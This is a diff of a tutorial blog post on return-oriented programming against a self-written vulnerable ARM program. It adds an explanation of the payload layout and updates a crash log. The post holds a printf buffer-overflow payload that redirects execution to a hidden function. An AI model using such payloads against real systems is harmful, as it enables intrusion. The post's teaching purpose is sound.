@@ -15,7 +15,7 @@
 <meta itemprop="description" content="Assembler Assembly language is based on registers, that can store data or addresses, and each assembly instruction manipulate these registers in some way.">
 <meta itemprop="datePublished" content="2020-08-12T23:07:00+02:00" />
 <meta itemprop="dateModified" content="2020-08-12T23:07:00+02:00" />
-<meta itemprop="wordCount" content="1216">
+<meta itemprop="wordCount" content="1282">
 
 
 
@@ -160,7 +160,7 @@
   <h1>0x03 Return Oriented Programming</h1>
 
   <div class="post-date">
-    <time datetime="2020-08-12T23:07:00&#43;0200">Aug 12, 2020</time> &middot; 6 min read
+    <time datetime="2020-08-12T23:07:00&#43;0200">Aug 12, 2020</time> &middot; 7 min read
   </div>
 
   <h2 id="assembler">Assembler</h2>
@@ -180,7 +180,7 @@
 
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change</span>(){
     strcpy(string,<span style="color:#e6db74">&#34;uname -a&#34;</span>);
-	printf(<span style="color:#e6db74">&#34;You changed string for uname ;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;You changed string to execute ;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 }
 
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hidden</span>(){
@@ -293,7 +293,9 @@ Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color
 0x0000bea8 &lt;hidden+48&gt;:  <span style="color:#ae81ff">07</span> d0 a0 e1                   mov	sp, r7
 0x0000beac &lt;hidden+52&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r7, pc<span style="color:#f92672">}</span>
 End of assembler dump.
-</code></pre></div><p>Now it&rsquo;s time for manipulating input data and analysing the crashlog. We know (or we could have find that in testing) that our buffer is declared for 12 characters and that <code>FFFF</code> are being written to program counter <code>pc</code>. We will swap it for <code>mov	r7, sp</code> of <code>change()</code> function, then we need to add to fill <code>r7</code> register with whatever (so anything like <code>0xffffffff</code> will do), and then we&rsquo;ll give address to <code>hidden()</code> function.</p>
+</code></pre></div><p>Now it&rsquo;s time for manipulating input data and analysing the crashlog. We know (or we could have find that in testing) that our buffer is declared for 12 characters and that <code>FFFF</code> are being written to program counter <code>pc</code>. We will swap it for second instruction of <code>change()</code> function (<code>mov	r7, sp</code>). Jumping to second instruction will let us avoid initial <code>push</code> instruction, so we can set up the stack with return values pointing to <code>secret()</code> function.
+Then we need to add to fill <code>r7</code> register with whatever (so anything like <code>0xffffffff</code> will do to see it in logs eventually), and then we&rsquo;ll give address to <code>hidden()</code> function.</p>
+<p>String to contruct should be considered as: some offset value + address of change() + offset value + addres of secret()</p>
 <p>So after much much testing, string to supply for my program was:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEE\x38\xbe\x00\x00\xff\xff\xff\xff\x78\xbe\x00\x00&#34;</span> | ./0x03
 
@@ -309,14 +311,16 @@ Bus error: <span style="color:#ae81ff">10</span>
 <p>And quick last look at the crash log:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/mobile/Library/Logs/CrashReporter/0x03-2020-08-12-144840.ips
 
-Exception Type:  EXC_CRASH <span style="color:#f92672">(</span>SIGABRT<span style="color:#f92672">)</span>
+Exception Type:  EXC_BAD_ACCESS <span style="color:#f92672">(</span>SIGBUS<span style="color:#f92672">)</span>
+Exception Subtype: EXC_ARM_DA_ALIGN at 0xffffffff
+Termination Signal: Bus error: <span style="color:#ae81ff">10</span>
 
 Thread <span style="color:#ae81ff">0</span> crashed with ARM Thread State <span style="color:#f92672">(</span>32-bit<span style="color:#f92672">)</span>:
-    r0: 0x00000000    r1: 0x00000000      r2: 0x00000000      r3: 0x00000000
-    r4: 0x00000006    r5: 0x3af15e40      r6: 0x00000007      r7: 0x001e8cc8
-    r8: 0x001e8d58    r9: 0x7ffd7ff9     r10: 0x00000000     r11: 0x00000000
-    ip: 0x00000148    sp: 0x001e8cbc      lr: 0x1cfc6087      pc: 0x1cf0dacc
-  cpsr: 0x00000010
+    r0: 0x00000000    r1: 0x00000000      r2: 0xd26300a2      r3: 0x00000103
+    r4: 0x00000000    r5: 0x0000beb0      r6: 0x00000000      r7: 0xffffffff
+    r8: 0x001d8d50    r9: 0x00000000     r10: 0x00000000     r11: 0x00000000
+    ip: 0x3a051398    sp: 0xffffffff      lr: 0x00000000      pc: 0x0000be74
+  cpsr: 0x60000010
 </code></pre></div>
 </div>
 
